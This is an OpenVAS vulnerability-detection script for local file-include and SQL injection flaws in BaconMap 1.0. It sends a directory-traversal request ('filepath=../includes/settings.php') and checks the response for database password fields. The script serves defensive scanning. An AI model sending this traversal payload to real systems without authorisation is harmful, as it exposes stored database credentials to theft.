###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_baconmap_43908.nasl 14 2013-10-27 12:33:37Z jan $
#
# BaconMap Local File Include and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "BaconMap is prone to a local file-include vulnerability and an SQL-
injection vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit the local file-include vulnerability using directory-
traversal strings to view and execute arbitrary local files within the
context of the webserver process. Information harvested may aid in
further attacks.

The attacker can exploit the SQL-injection vulnerability to compromise
the application, access or modify data, exploit latent vulnerabilities
in the underlying database, or bypass the authentication control.

BaconMap 1.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100853);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-10-13 13:28:00 +0200 (Wed, 13 Oct 2010)");
 script_cve_id("CVE-2010-4800", "CVE-2010-4801");
 script_bugtraq_id(43908);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("BaconMap Local File Include and SQL Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43908");
 script_xref(name : "URL" , value : "http://baconmap.nmsu.edu/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if BaconMap is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/baconmap","/map",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir,"/admin/updatelist.php?filepath=../includes/settings.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"This file is the settings file for BaconMap",extra_check:make_list("\$database","\$password","\$dbhost"))) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);
